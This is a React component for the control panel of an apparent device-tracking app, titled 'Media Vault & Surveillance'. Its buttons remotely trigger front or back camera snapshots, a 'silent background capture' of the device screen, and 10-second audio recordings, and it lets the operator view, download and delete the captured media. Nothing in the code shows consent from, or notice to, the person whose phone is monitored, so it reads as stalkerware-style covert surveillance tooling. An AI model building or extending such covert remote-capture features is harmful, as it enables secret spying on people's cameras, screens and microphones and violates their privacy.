import React, { useState } from 'react';
import { Camera, Mic, Download, ExternalLink, Image as ImageIcon, Volume2, Maximize2, X, Trash2, RefreshCw, Smartphone } from 'lucide-react';
import { deleteMediaRecord, triggerCameraSnapshot, triggerAudioRecording, triggerScreenshot } from '../services/trackerService';
import { downloadFileSafely } from '../utils/fileDownloader';

export default function MediaViewer({ media = [], deviceId }) {
  const [activeTab, setActiveTab] = useState('ALL'); // ALL, IMAGE, SCREENSHOT, AUDIO
  const [selectedPhoto, setSelectedPhoto] = useState(null);
  const [deletingId, setDeletingId] = useState(null);
  const [useFrontCamera, setUseFrontCamera] = useState(false);
  const [isCapturing, setIsCapturing] = useState(false);
  const [statusMsg, setStatusMsg] = useState(null);

  const handleDownload = async (e, item) => {
    e.stopPropagation();
    try {
      await downloadFileSafely(item, deviceId);
    } catch (err) {
      console.error('Download error:', err);
    }
  };

  const filteredMedia = media.filter(item => {
    if (activeTab === 'IMAGE') return item.type === 'IMAGE';
    if (activeTab === 'SCREENSHOT') return item.type === 'SCREENSHOT';
    if (activeTab === 'AUDIO') return item.type === 'AUDIO';
    return true;
  });

  const formatFileSize = (bytes) => {
    if (!bytes) return 'Unknown';
    if (bytes < 1024) return `${bytes} B`;
    if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
    return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
  };

  const formatTimestamp = (timestamp) => {
    if (!timestamp) return 'Just now';
    if (timestamp.toDate) return timestamp.toDate().toLocaleString([], { dateStyle: 'short', timeStyle: 'short' });
    if (timestamp instanceof Date) return timestamp.toLocaleString([], { dateStyle: 'short', timeStyle: 'short' });
    return new Date(timestamp).toLocaleString([], { dateStyle: 'short', timeStyle: 'short' });
  };

  const handleDelete = async (e, mediaId) => {
    e.stopPropagation();
    if (!window.confirm('Are you sure you want to delete this media item?')) return;
    setDeletingId(mediaId);
    try {
      await deleteMediaRecord(deviceId, mediaId);
      setStatusMsg({ type: 'success', text: 'Media deleted successfully' });
      setTimeout(() => setStatusMsg(null), 3000);
      if (selectedPhoto?.id === mediaId) {
        setSelectedPhoto(null);
      }
    } catch (err) {
      setStatusMsg({ type: 'error', text: 'Failed to delete media item' });
      setTimeout(() => setStatusMsg(null), 4000);
    } finally {
      setDeletingId(null);
    }
  };

  const handleCaptureSnapshot = async () => {
    if (!deviceId) return;
    setIsCapturing(true);
    setStatusMsg(null);
    try {
      await triggerCameraSnapshot(deviceId, useFrontCamera);
      setStatusMsg({ type: 'success', text: `Snapshot triggered (${useFrontCamera ? 'Front Selfie' : 'Back Camera'})` });
      setTimeout(() => setStatusMsg(null), 4000);
    } catch (err) {
      setStatusMsg({ type: 'error', text: 'Failed to trigger camera snapshot' });
      setTimeout(() => setStatusMsg(null), 4000);
    } finally {
      setIsCapturing(false);
    }
  };

  const handleCaptureScreenshot = async () => {
    if (!deviceId) return;
    setIsCapturing(true);
    setStatusMsg(null);
    try {
      await triggerScreenshot(deviceId);
      setStatusMsg({ type: 'success', text: 'Live screen screenshot command dispatched' });
      setTimeout(() => setStatusMsg(null), 4000);
    } catch (err) {
      setStatusMsg({ type: 'error', text: 'Failed to trigger screen screenshot' });
      setTimeout(() => setStatusMsg(null), 4000);
    } finally {
      setIsCapturing(false);
    }
  };

  const handleRecordAudio = async () => {
    if (!deviceId) return;
    setIsCapturing(true);
    setStatusMsg(null);
    try {
      await triggerAudioRecording(deviceId, 10);
      setStatusMsg({ type: 'success', text: '10s audio recording command dispatched' });
      setTimeout(() => setStatusMsg(null), 4000);
    } catch (err) {
      setStatusMsg({ type: 'error', text: 'Failed to trigger audio recording' });
      setTimeout(() => setStatusMsg(null), 4000);
    } finally {
      setIsCapturing(false);
    }
  };

  return (
    <div className="bg-slate-900 border border-slate-800 rounded-xl sm:rounded-2xl p-4 sm:p-6 shadow-xl space-y-4">
      {/* Top Header */}
      <div className="flex flex-col lg:flex-row lg:items-center justify-between pb-4 border-b border-slate-800 gap-3">
        <div>
          <div className="flex items-center space-x-2">
            <h2 className="text-base sm:text-lg font-bold text-white flex items-center space-x-2">
              <ImageIcon className="w-4 h-4 sm:w-5 sm:h-5 text-cyan-400" />
              <span>Media Vault & Surveillance</span>
            </h2>
            <span className="px-2 py-0.5 rounded-full text-xs font-bold bg-purple-500/20 text-purple-300 border border-purple-500/30">
              {media.length} Items
            </span>
          </div>
          <p className="text-[11px] sm:text-xs text-slate-400 mt-0.5">
            Remote snapshots, screen captures & voice recordings with instant preview and download controls
          </p>
        </div>

        {/* Quick Capture Toolbar */}
        <div className="flex flex-wrap items-center gap-2">
          {/* Front / Back Toggle */}
          <div className="flex items-center bg-slate-950 p-1 rounded-xl border border-slate-800 text-xs">
            <button
              onClick={() => setUseFrontCamera(false)}
              className={`px-2.5 py-1 rounded-lg font-medium transition-colors ${
                !useFrontCamera ? 'bg-cyan-500 text-black font-bold' : 'text-slate-400 hover:text-white'
              }`}
            >
              Back Cam
            </button>
            <button
              onClick={() => setUseFrontCamera(true)}
              className={`px-2.5 py-1 rounded-lg font-medium transition-colors ${
                useFrontCamera ? 'bg-cyan-500 text-black font-bold' : 'text-slate-400 hover:text-white'
              }`}
            >
              Front Selfie
            </button>
          </div>

          <button
            onClick={handleCaptureSnapshot}
            disabled={isCapturing}
            className="flex items-center space-x-1.5 px-3 py-1.5 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-black font-bold text-xs transition-colors shadow-sm disabled:opacity-50"
          >
            <Camera className="w-3.5 h-3.5" />
            <span>Snap Photo</span>
          </button>

          <button
            onClick={handleCaptureScreenshot}
            disabled={isCapturing}
            className="flex items-center space-x-1.5 px-3 py-1.5 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-black font-bold text-xs transition-colors shadow-sm disabled:opacity-50"
            title="Silent background capture of device screen"
          >
            <Smartphone className="w-3.5 h-3.5" />
            <span>Capture Screen</span>
          </button>

          <button
            onClick={handleRecordAudio}
            disabled={isCapturing}
            className="flex items-center space-x-1.5 px-3 py-1.5 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-bold text-xs transition-colors shadow-sm disabled:opacity-50"
          >
            <Mic className="w-3.5 h-3.5" />
            <span>Record 10s</span>
          </button>
        </div>
      </div>

      {/* Filter Tabs & Notification */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2.5">
        <div className="flex items-center space-x-1.5 p-1 bg-slate-950 rounded-xl border border-slate-800 shrink-0 overflow-x-auto">
          {[
            { id: 'ALL', label: `All Files (${media.length})` },
            { id: 'IMAGE', label: `Camera Photos (${media.filter(m => m.type === 'IMAGE').length})` },
            { id: 'SCREENSHOT', label: `Screenshots (${media.filter(m => m.type === 'SCREENSHOT').length})` },
            { id: 'AUDIO', label: `Audio (${media.filter(m => m.type === 'AUDIO').length})` }
          ].map(tab => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`px-3 py-1.5 rounded-lg text-xs font-semibold whitespace-nowrap transition-all ${
                activeTab === tab.id
                  ? 'bg-cyan-500 text-black shadow-sm font-bold'
                  : 'text-slate-400 hover:text-white'
              }`}
            >
              {tab.label}
            </button>
          ))}
        </div>

        {statusMsg && (
          <span className={`text-xs px-3 py-1 rounded-xl border font-medium ${
            statusMsg.type === 'success'
              ? 'bg-emerald-950/60 border-emerald-500/40 text-emerald-300'
              : 'bg-rose-950/60 border-rose-500/40 text-rose-300'
          }`}>
            {statusMsg.text}
          </span>
        )}
      </div>

      {/* Media Grid */}
      {filteredMedia.length === 0 ? (
        <div className="py-12 sm:py-16 text-center border-2 border-dashed border-slate-800 rounded-xl bg-slate-950/40 p-4">
          <ImageIcon className="w-10 h-10 sm:w-12 sm:h-12 text-slate-600 mx-auto mb-2.5" />
          <h3 className="text-sm font-semibold text-slate-300">No Media Files Captured Yet</h3>
          <p className="text-xs text-slate-500 max-w-sm mx-auto mt-1">
            Trigger a Camera snapshot, Screen capture, or Audio recording using the buttons above.
          </p>
        </div>
      ) : (
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3.5 sm:gap-4">
          {filteredMedia.map(item => (
            <div
              key={item.id}
              className="bg-slate-950/70 border border-slate-800 rounded-xl overflow-hidden shadow-lg transition-transform hover:-translate-y-0.5 group"
            >
              {item.type === 'IMAGE' || item.type === 'SCREENSHOT' ? (
                <div>
                  <div className="relative aspect-video bg-black/60 overflow-hidden cursor-pointer" onClick={() => setSelectedPhoto(item)}>
                    <img
                      src={item.downloadUrl}
                      alt={item.fileName || 'Snapshot'}
                      className="w-full h-full object-cover transition-transform duration-300 group-hover:scale-105"
                      loading="lazy"
                    />
                    <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent opacity-0 group-hover:opacity-100 transition-opacity flex items-end justify-between p-2.5 sm:p-3">
                      <span className="text-[10px] sm:text-[11px] text-white font-mono bg-black/60 px-2 py-0.5 rounded">
                        {formatFileSize(item.fileSize)}
                      </span>
                      <div className="flex items-center space-x-1.5">
                        <button
                          onClick={(e) => handleDelete(e, item.id)}
                          disabled={deletingId === item.id}
                          className="p-1.5 rounded-lg bg-rose-600/80 hover:bg-rose-600 text-white transition-colors"
                          title="Delete media"
                        >
                          <Trash2 className="w-3.5 h-3.5" />
                        </button>
                        <button
                          onClick={(e) => {
                            e.stopPropagation();
                            setSelectedPhoto(item);
                          }}
                          className={`p-1.5 rounded-lg text-black hover:opacity-90 transition-colors ${
                            item.type === 'SCREENSHOT' ? 'bg-emerald-400' : 'bg-cyan-500'
                          }`}
                          title="View Fullscreen"
                        >
                          <Maximize2 className="w-3.5 h-3.5" />
                        </button>
                      </div>
                    </div>
                  </div>
                  <div className="p-3">
                    <div className="flex items-center justify-between text-xs">
                      <span className="font-semibold text-white flex items-center space-x-1.5 truncate max-w-[170px]">
                        {item.type === 'SCREENSHOT' ? (
                          <Smartphone className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
                        ) : (
                          <Camera className="w-3.5 h-3.5 text-cyan-400 shrink-0" />
                        )}
                        <span className="truncate">{item.fileName || (item.type === 'SCREENSHOT' ? 'Screen Screenshot' : 'Camera Snapshot')}</span>
                      </span>
                      <div className="flex items-center space-x-1 shrink-0 ml-1">
                        <button
                          onClick={(e) => handleDelete(e, item.id)}
                          disabled={deletingId === item.id}
                          className="text-slate-500 hover:text-rose-400 transition-colors p-1"
                          title="Delete record"
                        >
                          <Trash2 className="w-3.5 h-3.5" />
                        </button>
                        <button
                          onClick={(e) => handleDownload(e, item)}
                          className="text-slate-400 hover:text-cyan-400 transition-colors p-1"
                          title="Download photo"
                        >
                          <Download className="w-3.5 h-3.5" />
                        </button>
                      </div>
                    </div>
                    <div className="flex items-center justify-between text-[11px] text-slate-400 mt-1">
                      <span>{formatTimestamp(item.timestamp)}</span>
                      <div className="flex items-center space-x-1.5">
                        {item.type === 'SCREENSHOT' && (
                          <span className="text-[10px] font-mono px-1.5 py-0.5 rounded bg-emerald-950/80 text-emerald-300 border border-emerald-800/40">
                            📱 Screen
                          </span>
                        )}
                        <span className="text-[10px] font-mono px-1.5 py-0.5 rounded bg-slate-900 text-purple-300 border border-purple-800/40">
                          {item.storageProvider === 'FREE_INLINE' ? '⚡ Free Spark' : (item.storageProvider || 'Free Mode')}
                        </span>
                      </div>
                    </div>
                  </div>
                </div>
              ) : (
                <div className="p-3.5 sm:p-4 flex flex-col justify-between h-full space-y-3">
                  <div>
                    <div className="flex items-center justify-between">
                      <div className="flex items-center space-x-2 truncate">
                        <div className="p-2 rounded-lg bg-purple-950/60 border border-purple-800/40 text-purple-400 shrink-0">
                          <Volume2 className="w-4 h-4" />
                        </div>
                        <div className="truncate">
                          <div className="text-xs font-semibold text-white truncate max-w-[150px]">
                            {item.fileName || 'Audio Recording'}
                          </div>
                          <div className="text-[10px] text-slate-400">{formatFileSize(item.fileSize)}</div>
                        </div>
                      </div>
                      <div className="flex items-center space-x-1 shrink-0 ml-1">
                        <button
                          onClick={(e) => handleDelete(e, item.id)}
                          disabled={deletingId === item.id}
                          className="text-slate-500 hover:text-rose-400 transition-colors p-1.5 rounded-lg bg-slate-800"
                          title="Delete audio note"
                        >
                          <Trash2 className="w-3.5 h-3.5" />
                        </button>
                        <button
                          onClick={(e) => handleDownload(e, item)}
                          className="text-slate-400 hover:text-purple-400 transition-colors p-1.5 rounded-lg bg-slate-800"
                          title="Download audio recording"
                        >
                          <Download className="w-3.5 h-3.5" />
                        </button>
                      </div>
                    </div>

                    <div className="mt-3">
                      <audio controls className="w-full h-8" src={item.downloadUrl}>
                        Your browser does not support audio playback.
                      </audio>
                    </div>
                  </div>

                  <div className="text-[11px] text-slate-400 pt-2 border-t border-slate-800 flex items-center justify-between">
                    <span>{formatTimestamp(item.timestamp)}</span>
                    <div className="flex items-center space-x-1.5">
                      <span className="text-[10px] font-mono px-1.5 py-0.5 rounded bg-slate-900 text-purple-300 border border-purple-800/40">
                        {item.storageProvider === 'FREE_INLINE' ? '⚡ Free Spark' : (item.storageProvider || 'Free Mode')}
                      </span>
                      <span className="font-mono text-purple-300 font-medium">{item.durationSeconds || 10}s clip</span>
                    </div>
                  </div>
                </div>
              )}
            </div>
          ))}
        </div>
      )}

      {/* Lightbox Modal */}
      {selectedPhoto && (
        <div
          className="fixed inset-0 z-50 bg-black/90 backdrop-blur-md flex items-center justify-center p-3 sm:p-6"
          onClick={() => setSelectedPhoto(null)}
        >
          <div className="relative w-full max-w-4xl max-h-[92vh] bg-slate-900 border border-slate-800 rounded-2xl overflow-hidden shadow-2xl flex flex-col" onClick={e => e.stopPropagation()}>
            <button
              onClick={() => setSelectedPhoto(null)}
              className="absolute top-3 right-3 z-10 p-2 rounded-full bg-black/70 text-white hover:bg-black/90 transition-colors"
            >
              <X className="w-5 h-5" />
            </button>
            <div className="flex-1 flex items-center justify-center p-2 sm:p-4 bg-black/40 overflow-hidden">
              <img
                src={selectedPhoto.downloadUrl}
                alt="Snapshot Lightbox"
                className="max-h-[65vh] sm:max-h-[75vh] w-auto max-w-full object-contain rounded-lg"
              />
            </div>
            <div className="p-3.5 sm:p-4 bg-slate-900 border-t border-slate-800 flex flex-col sm:flex-row sm:items-center justify-between text-xs text-slate-300 gap-2">
              <div>
                <div className="font-bold text-white text-sm truncate max-w-[280px] sm:max-w-md flex items-center space-x-2">
                  <span className={`text-[10px] font-mono px-2 py-0.5 rounded border ${
                    selectedPhoto.type === 'SCREENSHOT'
                      ? 'bg-emerald-950 text-emerald-300 border-emerald-800/40'
                      : 'bg-cyan-950 text-cyan-300 border-cyan-800/40'
                  }`}>
                    {selectedPhoto.type === 'SCREENSHOT' ? '📱 Mobile Screen' : '📷 Camera'}
                  </span>
                  <span className="truncate">{selectedPhoto.fileName}</span>
                </div>
                <div className="text-[11px] text-slate-400 mt-0.5">{formatTimestamp(selectedPhoto.timestamp)} • {formatFileSize(selectedPhoto.fileSize)}</div>
              </div>
              <div className="flex items-center space-x-2">
                <button
                  onClick={(e) => handleDelete(e, selectedPhoto.id)}
                  className="flex items-center space-x-1.5 px-3 py-2 rounded-xl bg-rose-600 hover:bg-rose-500 text-white font-semibold text-xs"
                >
                  <Trash2 className="w-3.5 h-3.5" />
                  <span>Delete</span>
                </button>
                <a
                  href={selectedPhoto.downloadUrl}
                  target="_blank"
                  rel="noreferrer"
                  download
                  className="flex items-center justify-center space-x-1.5 px-4 py-2 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-black font-semibold text-xs"
                >
                  <Download className="w-3.5 h-3.5" />
                  <span>Download</span>
                </a>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
